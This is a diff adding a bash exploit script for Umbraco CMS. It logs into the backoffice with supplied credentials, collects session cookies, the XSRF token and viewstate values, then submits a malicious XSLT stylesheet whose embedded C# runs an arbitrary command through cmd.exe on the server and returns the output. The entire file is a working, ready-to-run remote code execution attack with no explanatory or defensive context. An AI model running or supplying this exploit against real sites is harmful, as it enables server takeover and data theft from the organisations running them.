@@ -1,0 +1,87 @@
+#!/bin/bash
+
+if [ "$#" -ne 4 ]; then
+    echo "Usage: $0 <username> <password> <target_url> <full_command>"
+    exit 1
+fi
+
+USERNAME=$1
+PASSWORD=$2
+TARGET=$3
+FULL_COMMAND=$4
+
+# XSLT Payload
+PAYLOAD='<?xml version="1.0"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
+<msxsl:script language="C#" implements-prefix="csharp_user">
+public string xml() { 
+  string cmd = "'$FULL_COMMAND'"; 
+  System.Diagnostics.Process proc = new System.Diagnostics.Process();
+  proc.StartInfo.FileName = "cmd.exe"; 
+  proc.StartInfo.Arguments = "/c " + cmd; 
+  proc.StartInfo.UseShellExecute = false; 
+  proc.StartInfo.RedirectStandardOutput = true;  
+  proc.Start(); 
+  string output = proc.StandardOutput.ReadToEnd(); 
+  return output; 
+}  
+</msxsl:script>
+<xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> 
+</xsl:stylesheet>'
+
+echo "[*] Step 1 - Logging in..."
+# Use -D - to capture headers
+LOGIN_RESPONSE=$(curl -s -X POST -D - -H "Content-Type: application/json" \
+    -d "{\"username\":\"$USERNAME\", \"password\":\"$PASSWORD\"}" \
+    "$TARGET/umbraco/backoffice/UmbracoApi/Authentication/PostLogin")
+
+# Save response for debugging
+echo "$LOGIN_RESPONSE" > debug_login_response.txt
+
+# Extract cookies from the headers
+COOKIES=$(echo "$LOGIN_RESPONSE" | grep -oP 'Set-Cookie: \K[^;]+' | tr '\n' '; ')
+UMB_XSRF_TOKEN=$(echo "$COOKIES" | grep -oP 'UMB-XSRF-TOKEN=\K[^;]*')
+
+if [[ -z "$COOKIES" || -z "$UMB_XSRF_TOKEN" ]]; then
+    echo "[!] Login failed. Check credentials or debug_login_response.txt for details."
+    exit 1
+fi
+echo "[+] Login successful!"
+
+echo "[*] Step 2 - Accessing XSLT Visualize page..."
+XS_RESPONSE=$(curl -s -H "Cookie: $COOKIES" "$TARGET/umbraco/developer/Xslt/xsltVisualize.aspx")
+
+# Save response for debugging
+echo "$XS_RESPONSE" > debug_xslt_response.html
+
+VIEWSTATE=$(echo "$XS_RESPONSE" | grep -oP '(?<=id="__VIEWSTATE" value=")[^"]*')
+VIEWSTATEGENERATOR=$(echo "$XS_RESPONSE" | grep -oP '(?<=id="__VIEWSTATEGENERATOR" value=")[^"]*')
+
+if [ -z "$VIEWSTATE" ] || [ -z "$VIEWSTATEGENERATOR" ]; then
+    echo "[!] Failed to fetch necessary tokens."
+    exit 1
+fi
+echo "[+] Successfully fetched tokens."
+
+echo "[*] Step 3 - Sending malicious payload..."
+ATTACK_RESPONSE=$(curl -s -H "Cookie: $COOKIES" \
+    -H "UMB-XSRF-TOKEN: $UMB_XSRF_TOKEN" \
+    --data-urlencode "__EVENTTARGET=" \
+    --data-urlencode "__EVENTARGUMENT=" \
+    --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
+    --data-urlencode "__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR" \
+    --data-urlencode "ctl00\$body\$xsltSelection=$PAYLOAD" \
+    --data-urlencode "ctl00\$body\$contentPicker\$ContentIdValue=" \
+    --data-urlencode "ctl00\$body\$visualizeDo=Visualize+XSLT" \
+    "$TARGET/umbraco/developer/Xslt/xsltVisualize.aspx")
+
+# Save attack response for debugging
+echo "$ATTACK_RESPONSE" > debug_attack_response.html
+
+if [[ $ATTACK_RESPONSE == *"result"* ]]; then
+    echo "[+] Payload executed successfully. Check the target!"
+else
+    echo "[!] Exploit failed. Debugging recommended."
+fi
+
+echo "[*] Exploit completed."
